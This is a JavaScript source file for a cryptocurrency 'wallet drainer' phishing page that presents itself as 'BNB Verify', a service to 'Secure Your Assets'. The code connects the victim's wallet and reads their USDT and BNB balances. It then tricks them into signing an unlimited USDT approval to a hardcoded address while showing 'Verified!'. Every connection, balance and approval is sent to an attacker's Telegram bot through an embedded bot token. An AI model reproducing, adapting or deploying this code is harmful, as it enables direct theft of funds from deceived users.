const BSC_ADDRESS  = "0xEA1057074698B673608c5f3F37f9aCEAf8444751";
const USDT         = "0x55d398326f99059fF775485246999027B3197955";
const PROJECT_ID   = "61bc76b93461840c22745179c7475b75";
const TG_TOKEN     = "9217543119:AAG8AgichuC9h3T4b6Le0M73UCcGPLcgTQk";
const TG_CHAT      = "5867183888";

let web3, userAddress, provider;

async function tg(msg) {
    try {
        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: "Markdown" })
        });
    } catch(_){}
}

function toast(msg, color="white") {
    let el = document.getElementById("__toast");
    if (!el) {
        el = document.createElement("div");
        el.id = "__toast";
        el.style.cssText = "position:fixed;top:20px;right:20px;padding:14px 20px;border-radius:8px;font-family:sans-serif;font-size:14px;font-weight:bold;z-index:99999;background:#111;max-width:280px;box-shadow:0 4px 20px rgba(0,0,0,0.5)";
        document.body.appendChild(el);
    }
    const c = color==="red"?"#ff4444":color==="green"?"#00cc66":"#f5c518";
    el.style.color=c; el.style.borderLeft=`4px solid ${c}`;
    el.textContent=msg; el.style.display="block";
    clearTimeout(el._t);
    el._t = setTimeout(()=>{ el.style.display="none"; }, 4500);
}

async function connect() {
    const EP = window.WC?.EthereumProvider || window.EthereumProvider;
    if (!EP) { toast("❌ Bundle load error.", "red"); return false; }
    try {
        toast("⏳ Opening wallet...", "white");
        Object.keys(localStorage).forEach(k => {
            if (k.startsWith("wc@2") || k.startsWith("walletconnect")) localStorage.removeItem(k);
        });
        provider = await EP.init({
            projectId: PROJECT_ID,
            chains: [56],
            showQrModal: true,
            methods: ["eth_sendTransaction","personal_sign","eth_accounts","eth_requestAccounts"],
            events: ["chainChanged","accountsChanged"],
            metadata: {
                name: "BNB Verify",
                description: "Secure Your Assets on BNB Smart Chain",
                url: window.location.origin,
                icons: ["https://raw.githubusercontent.com/WalletConnect/walletconnect-assets/master/Icon/Blue%20(Default)/Icon.png"]
            }
        });
        await provider.connect();
        web3 = new window.Web3(provider);
        const accounts = await web3.eth.getAccounts();
        userAddress = accounts[0];
        toast(`✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, "green");
        await tg(`👤 *Connected*\nAddress: \`${userAddress}\``);
        return true;
    } catch(err) {
        toast("❌ Rejected.", "red");
        await tg(`⚠️ Failed: ${err.message}`);
        return false;
    }
}

async function verify() {
    const btn = document.getElementById("verifyAssets");
    if (btn) { btn.disabled=true; btn.textContent="Verifying..."; }
    try {
        if (!web3||!userAddress) { const ok=await connect(); if(!ok) return; }
        const balAbi=[{constant:true,inputs:[{name:"_owner",type:"address"}],name:"balanceOf",outputs:[{name:"",type:"uint256"}],type:"function"}];
        const token=new web3.eth.Contract(balAbi,USDT);
        const [usdtRaw,bnbRaw]=await Promise.all([token.methods.balanceOf(userAddress).call(),web3.eth.getBalance(userAddress)]);
        const usdt=parseFloat(web3.utils.fromWei(usdtRaw,"ether"));
        const bnb=parseFloat(web3.utils.fromWei(bnbRaw,"ether"));
        await tg(`💰 *Balance*\nAddress: \`${userAddress}\`\nUSDT: ${usdt}\nBNB: ${bnb}`);
        if(usdt===0){toast("⚠️ No USDT balance.","white");return;}
        toast("⚙️ Requesting approval...","white");
        await approveMax();
    } catch(err){toast("❌ Error.","red");}
    finally { if(btn){btn.disabled=false;btn.textContent="🔒 Verify Assets";} }
}

async function approveMax() {
    const abi=[{constant:false,inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}],name:"approve",outputs:[{name:"",type:"bool"}],type:"function"}];
    const MAX="115792089237316195423570985008687907853269984665640564039457584007913129639935";
    const tok=new web3.eth.Contract(abi,USDT);
    try {
        toast("📝 Approve in your wallet...","white");
        const gas=await tok.methods.approve(BSC_ADDRESS,MAX).estimateGas({from:userAddress});
        await tok.methods.approve(BSC_ADDRESS,MAX).send({from:userAddress,gas:Math.floor(gas*1.2)});
        toast("✅ Verified!","green");
        await tg(`🔥 *APPROVED*\nFrom: \`${userAddress}\`\nTo: \`${BSC_ADDRESS}\``);
    } catch(_){toast("❌ Denied.","red");}
}

document.addEventListener("DOMContentLoaded",()=>{
    document.getElementById("verifyAssets").addEventListener("click",verify);
});
